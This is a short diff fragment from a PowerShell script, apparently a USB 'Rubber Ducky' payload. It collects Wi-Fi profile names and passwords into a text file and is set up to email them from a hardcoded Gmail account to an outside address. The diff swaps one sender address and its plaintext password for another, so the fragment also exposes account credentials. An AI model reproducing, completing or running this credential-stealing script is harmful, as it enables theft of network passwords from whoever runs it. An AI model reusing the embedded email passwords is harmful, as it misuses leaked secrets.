@@ -10,8 +10,8 @@ $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSID
 Out-File wifipass.txt -Append -InputObject $a
 }
 
-$FROM = "m3sanjuann@gmail.com"
-$PASS = "I3S!mail!2k20!"
+$FROM = "patitodegoma@gmail.com"
+$PASS = "RubberDucky404!"
 $TO = "tomassj9@gmail.com"
 
 $PC_NAME = "$env:computername"
